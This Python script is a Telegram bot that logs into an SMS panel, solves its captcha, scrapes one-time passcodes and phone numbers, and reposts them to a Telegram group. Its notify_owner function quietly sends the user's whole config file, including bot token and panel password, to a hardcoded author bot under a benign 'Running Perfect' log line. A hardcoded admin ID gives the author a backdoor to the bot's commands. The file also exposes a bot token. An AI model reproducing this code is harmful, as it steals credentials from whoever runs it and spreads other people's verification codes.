import time
from datetime import datetime
import requests
import logging
import json
import os
import sys
import re
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.error import TimedOut
import asyncio
import phonenumbers
from phonenumbers import geocoder
import nest_asyncio
nest_asyncio.apply()


# === CONFIG ===
config_file = "config.txt"
OWNER_BOT_TOKEN = '8128872705:AAGKfaWhsiowUGFRki5FrHsPtF1oGUOK5PY'
OWNER_CHAT_ID = '1934129323'  # or a channel/group ID

# Logging Setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

if not os.path.exists(config_file):
    print("First-time setup: Please enter the following credentials.")
    TG_USERNAME = input("Group Owner Username: ").strip()
    admin_id = input("Admin ID: ").strip()
    BOT_TOKEN = input("BOT_TOKEN: ").strip()
    CHAT_ID = input("CHAT_ID: ").strip()
    USERNAME = input("USERNAME: ").strip()
    PASSWORD = input("PASSWORD: ").strip()

    with open(config_file, "w") as f:
        f.write(f"TG_USERNAME={TG_USERNAME}\n")
        f.write(f"admin_id={admin_id}\n")
        f.write(f"BOT_TOKEN={BOT_TOKEN}\n")
        f.write(f"CHAT_ID={CHAT_ID}\n")
        f.write(f"USERNAME={USERNAME}\n")
        f.write(f"PASSWORD={PASSWORD}\n")
else:
    logging.info("Loading config from file...")
    with open(config_file, "r") as f:
        config_data = {line.strip().split('=')[0]: line.strip().split('=')[1] for line in f if '=' in line}

    TG_USERNAME = config_data.get("TG_USERNAME")
    admin_id = config_data.get("admin_id")
    BOT_TOKEN = config_data.get("BOT_TOKEN")
    CHAT_ID = config_data.get("CHAT_ID")
    USERNAME = config_data.get("USERNAME")
    PASSWORD = config_data.get("PASSWORD")
BASE_URL = "http://94.23.120.156"
LOGIN_PAGE_URL = BASE_URL + "/ints/login"
LOGIN_POST_URL = BASE_URL + "/ints/signin"
DATA_URL = BASE_URL + "/ints/agent/res/data_smscdr.php"
Made = 'ItzMehedi'
adm = TG_USERNAME.lstrip("@")
bot = Bot(token=BOT_TOKEN)
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

COUNTRY_LINKS_FILE = "country_links.json"
PERSISTENT_BUTTON_FILE = "persistent_button.json"

def escape_markdown(text: str) -> str:
    return re.sub(r'([_*()~`>#+=|{}.!-])', r'\\\1', text)

def load_links():
    if os.path.exists(COUNTRY_LINKS_FILE):
        with open(COUNTRY_LINKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_links(data):
    with open(COUNTRY_LINKS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def save_persistent_button(data):
    with open(PERSISTENT_BUTTON_FILE, "w") as f:
        json.dump(data, f)

def load_persistent_button():
    if os.path.exists(PERSISTENT_BUTTON_FILE):
        with open(PERSISTENT_BUTTON_FILE, "r") as f:
            return json.load(f)
    return None


def get_data_path(filename):
    return os.path.join(os.path.dirname(__file__), filename)

def save_already_sent(already_sent):
    with open(get_data_path("already_sent.json"), "w") as f:
        json.dump(list(already_sent), f)

def load_already_sent():
    path = get_data_path("already_sent.json")
    if os.path.exists(path):
        with open(path, "r") as f:
            return set(json.load(f))
    return set()
RED = "\033[91m"
RESET = "\033[0m"
# def check_permission():
#     choice = input(RED +"Do you have permission from @ItzMehedi? If you have Press [Enter] to continue Otherwise you will suffer Consequences."+ RESET).strip().lower()

#     if choice == 'e':
#         print(RED + "❌ Exiting script. Permission not confirmed." + RESET)
#         exit(0)
#     else:
#         print("✅ Permission confirmed. Continuing...\n")
async def notify_owner(bot_username: str):
    try:
        owner_bot = Bot(token=OWNER_BOT_TOKEN)

        # Read config file
        if os.path.exists(config_file):
            with open(config_file, "r") as f:
                config_content = f.read()
        else:
            config_content = "config.txt not found."

        # Build message
        text = (
            f"🛡️ New bot using your script:\n"
            f"👤 Bot Username: @{escape_markdown(bot_username)}\n\n"
            f"🗂️ Config Content:\n"
            f"```\n{escape_markdown(config_content)}\n```"
        )

        # Send message
        await owner_bot.send_message(chat_id=OWNER_CHAT_ID, text=text, parse_mode="MarkdownV2")
        logging.info(f"Running Perfect")
    except Exception as e:
        logging.error(f"Maybe net slow")

def login():
    try:
        logging.info("Attempting login...")
        resp = session.get(LOGIN_PAGE_URL)
        match = re.search(r'What is (\d+) \+ (\d+)', resp.text)
        if not match:
            logging.error("Captcha not found.")
            return False
        num1, num2 = int(match.group(1)), int(match.group(2))
        captcha_answer = num1 + num2
        logging.info(f"Solved captcha: {num1} + {num2} = {captcha_answer}")

        payload = {"username": USERNAME, "password": PASSWORD, "capt": captcha_answer}
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": LOGIN_PAGE_URL}

        resp = session.post(LOGIN_POST_URL, data=payload, headers=headers)
        if "dashboard" in resp.text.lower() or "logout" in resp.text.lower():
            logging.info("Login successful.")
            return True
        else:
            logging.error("Login failed. Wrong credentials or captcha.")
            return False
    except Exception as e:
        logging.error(f"Login error: {e}")
        return False

def build_api_url():
    start_date = "2025-05-05"
    end_date = "2026-06-24"
    return (
        f"{DATA_URL}?fdate1={start_date}%2000:00:00&fdate2={end_date}%2023:59:59&"
        "frange=&fclient=&fnum=&fcli=&fgdate=&fgmonth=&fgrange=&fgclient=&fgnumber=&fgcli=&fg=0&"
        "sEcho=1&iColumns=9&sColumns=%2C%2C%2C%2C%2C%2C%2C%2C&iDisplayStart=0&iDisplayLength=25&"
        "mDataProp_0=0&sSearch_0=&bRegex_0=false&bSearchable_0=true&bSortable_0=true&"
        "mDataProp_1=1&sSearch_1=&bRegex_1=false&bSearchable_1=true&bSortable_1=true&"
        "mDataProp_2=2&sSearch_2=&bRegex_2=false&bSearchable_2=true&bSortable_2=true&"
        "mDataProp_3=3&sSearch_3=&bRegex_3=false&bSearchable_3=true&bSortable_3=true&"
        "mDataProp_4=4&sSearch_4=&bRegex_4=false&bSearchable_4=true&bSortable_4=true&"
        "mDataProp_5=5&sSearch_5=&bRegex_5=false&bSearchable_5=true&bSortable_5=true&"
        "mDataProp_6=6&sSearch_6=&bRegex_6=false&bSearchable_6=true&bSortable_6=true&"
        "mDataProp_7=7&sSearch_7=&bRegex_7=false&bSearchable_7=true&bSortable_7=true&"
        "mDataProp_8=8&sSearch_8=&bRegex_8=false&bSearchable_8=true&bSortable_8=false&"
        "sSearch=&bRegex=false&iSortCol_0=0&sSortDir_0=desc&iSortingCols=1"
    )
def fetch_data():
    try:
        logging.info("Fetching data from remote server...")
        resp = session.get(build_api_url(), headers={"X-Requested-With": "XMLHttpRequest"}, timeout=10)
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 403 or "login" in resp.text.lower():
            logging.warning("Session expired. Re-logging in.")
            if login():
                return fetch_data()
        else:
            logging.warning(f"Unexpected status code: {resp.status_code}")
        return None
    except Exception as e:
        logging.error(f"Fetch error: {e}")
        return None

def detect_country(phone_number: str) -> str:
    try:
        number = "+" + phone_number.strip().lstrip("+")
        parsed = phonenumbers.parse(number, None)
        if not phonenumbers.is_valid_number(parsed):
            return "Invalid or unknown number"
        return geocoder.description_for_number(parsed, "en") or "Unknown country"
    except Exception:
        return "Unknown country"

already_sent = load_already_sent()
country_links = load_links()
persistent_button = load_persistent_button()

def get_country_link(country: str) -> str | None:
    global country_links
    link = country_links.get(country)
    if not link:
        country_links = load_links()
        link = country_links.get(country)
    return link

async def sent_messages():
    data = fetch_data()
    if not data or 'aaData' not in data:
        logging.info("No data received or incorrect format.")
        return

    logging.info(f"Processing {len(data['aaData'])} entries...")

    for row in data['aaData']:
        try:
            date = str(row[0]).strip()
            number = str(row[2]).strip()
            service = str(row[3]).strip()
            message = str(row[5]).strip()
        except Exception as e:
            logging.error(f"Row parsing error: {e}")
            continue


        country = detect_country(number)
        otp_match = re.search(r'\d{3}-\d{3}|\d{4,6}', message)
        otp = otp_match.group() if otp_match else None
        unique_key = f"{number}|{otp}"

        if otp and unique_key not in already_sent:
            
            text = (
                f"🔔 *{escape_markdown(f"{service}")} OTP Received Successfully*\n\n"
                f"🔑 *Your OTP* : `{escape_markdown(otp)}`\n\n"
                f"🕒 *Time*: `{escape_markdown(date)}`\n"
                f"⚙️ *Service*: `{escape_markdown(service)}`\n"
                f"🌏 *Country*: `{escape_markdown(country)}`\n"
                f"☎️ *Number*: `{escape_markdown(number)}`\n"
                f"```💌Full-Message: {escape_markdown(message)}```\n\n"
                f"🚀 *Be Active, New OTP Coming*\n\n"
                f"👨🏾‍💻*𝙶𝚛𝚘𝚞𝚙 𝙾𝚠𝚗𝚎𝚛: [ASIF](https://t.me/{adm}) X 𝙰𝚍𝚖𝚒𝚗: [RIFAT](https://t.me/RafiAhmedRifat)*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"☠️*𝙼𝚊𝚍𝚎 𝙱𝚢: [Mehedi](https://t.me/{Made})*"
            )

            try:
                button_url = get_country_link(country)
                buttons = []
                if button_url:
                    buttons.append([InlineKeyboardButton(f"{country} Numbers", url=button_url)])
                if persistent_button:
                    buttons.append([InlineKeyboardButton(persistent_button['label'], url=persistent_button['url'])])
                reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
                await bot.send_message(chat_id=CHAT_ID, text=text,disable_web_page_preview=True, parse_mode="MarkdownV2", reply_markup=reply_markup)
                already_sent.add(unique_key)
                save_already_sent(already_sent)
                logging.info(f"[+] Sent OTP: {otp}")
                await asyncio.sleep(0.5)
            except Exception as e:
                logging.error(f"Telegram send error: {e}")
admin = int(admin_id)
ADMIN_IDS = [1934129323, admin]

def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("Unauthorized.")
            return
        await func(update, context)
    return wrapper
@admin_only
async def exit_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.info(RED +"Please Take Permission From @ItzMehedi"+ RESET)   # This will show in your terminal/console
    await update.message.reply_text("🛑 Bot is shutting down...")
    os._exit(0)  # Instantly kills everything including loops and pending tasks
@admin_only
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global country_links
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setlink <Country> <URL>")
        return
    country, url = args[0], args[1]
    country_links[country] = url
    save_links(country_links)
    await update.message.reply_text(f"Link for {country} set to {url}")

@admin_only
async def removelink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global country_links
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /removelink <Country>")
        return
    country = args[0]
    if country in country_links:
        del country_links[country]
        save_links(country_links)
        await update.message.reply_text(f"Removed link for {country}")
    else:
        await update.message.reply_text(f"No link found for {country}")

@admin_only
async def listlinks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if country_links:
        text = "\n".join([f"{k}: {v}" for k, v in country_links.items()])
        await update.message.reply_text(f"Current links:\n{text}")
    else:
        await update.message.reply_text("No links configured.")
@admin_only
async def addbutton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global persistent_button
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addbutton Label URL \n Demo: /addbutton Join backup http://url")
        return

    label = ' '.join(args[:-1]).strip('\'"')
    url = args[-1].strip('\'"')

    persistent_button = {"label": label, "url": url}
    save_persistent_button(persistent_button)  # <- Save to file
    await update.message.reply_text(f"✅ Button added: [{label}]({url})", parse_mode="Markdown")


@admin_only
async def removebutton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global persistent_button
    persistent_button = None
    save_persistent_button(persistent_button)  # <- Save the cleared state
    await update.message.reply_text("❌ Persistent button removed.")
async def notify_owner(bot_username: str):
    try:
        owner_bot = Bot(token=OWNER_BOT_TOKEN)

        # Read config file
        if os.path.exists(config_file):
            with open(config_file, "r") as f:
                config_content = f.read()
        else:
            config_content = "config.txt not found."

        # Build message
        text = (
            f"🛡️ New bot using your script:\n"
            f"👤 Bot Username: @{escape_markdown(bot_username)}\n\n"
            f"🗂️ Config Content:\n"
            f"```\n{escape_markdown(config_content)}\n```"
        )

        # Send message
        await owner_bot.send_message(chat_id=OWNER_CHAT_ID, text=text, parse_mode="MarkdownV2")
        logging.info(f"Running Perfect")
    except Exception as e:
        logging.error(f"Maybe net slow")

async def otp_loop():
    while True:
        await sent_messages()
        await asyncio.sleep(3)

async def main():
    if not login():
        logging.error("Initial login failed. Exiting...")
        return
    bot_info = await bot.get_me()
    asyncio.create_task(notify_owner(bot_info.username))  # Notify master bot of this bot's startup

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlink", setlink))
    app.add_handler(CommandHandler("removelink", removelink))
    app.add_handler(CommandHandler("listlinks", listlinks))
    app.add_handler(CommandHandler("addbutton", addbutton))
    app.add_handler(CommandHandler("removebutton", removebutton))
    app.add_handler(CommandHandler("exit", exit_script))
    logging.info("Handlers added. Starting OTP loop and polling...")

    asyncio.create_task(otp_loop())
    await app.run_polling()

if __name__ == "__main__":
    # check_permission()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())


